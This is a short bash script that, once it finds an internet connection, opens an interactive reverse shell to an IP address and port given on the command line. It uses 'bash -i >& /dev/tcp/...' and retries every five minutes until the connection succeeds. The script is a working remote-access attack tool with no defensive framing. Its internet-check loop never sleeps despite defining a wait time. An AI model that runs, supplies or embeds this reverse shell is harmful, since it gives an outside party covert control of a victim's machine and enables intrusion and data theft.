#!/bin/bash

connection_wait_time=300 # 5 minutes
internet_wait_time=120

# port check
if [[ $1 == "" ]]; then
    echo "Please provide input for the port."
    exit
fi

# ip check
if [[ $2 == "" ]]; then
    echo "Please provide input for the ip address."
    exit
fi


# Internet check loop
while [ 1 ]; do
    echo "Checking if there is an active internet connection."
    ping -q -w1 -c1 google.com &>/dev/null && break
    echo "No internet. Waiting $internet_wait_time seconds and trying again."
done
echo "Internet works."

# Connection check loop
while [ 1 ]; do

    echo "Connecting to $2:$1."
    bash -i >& /dev/tcp/$2/$1 0>&1

    if [[ $? == 0 ]]; then
        echo "Thank you and goodbye"
        exit
    else
        echo "Exit code: $?"
        echo "Trying again in $connection_wait_time seconds."
        sleep $connection_wait_time
    fi
done